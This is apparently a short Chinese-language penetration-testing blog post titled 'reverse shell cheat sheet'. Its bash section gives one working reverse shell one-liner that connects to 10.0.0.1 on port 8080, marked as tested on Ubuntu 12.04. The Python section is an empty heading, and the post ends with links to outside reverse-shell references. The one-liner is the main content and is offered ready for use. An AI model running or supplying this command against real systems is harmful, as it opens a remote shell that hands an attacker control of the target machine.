---
layout: post
title: "reverse shell cheat sheet"
description: ""
category: 渗透测试
tags: [反弹shell]
---
{% include JB/setup %}


# BASH #

	bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

ubuntu 12.04测试OK

# python #



## 参考资料 ##

[翻译自](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

[反弹shell的十种姿势（偶然看到一些整理下）](http://zone.wooyun.org/content/5064)

[python反弹shell](http://zone.wooyun.org/content/6041)
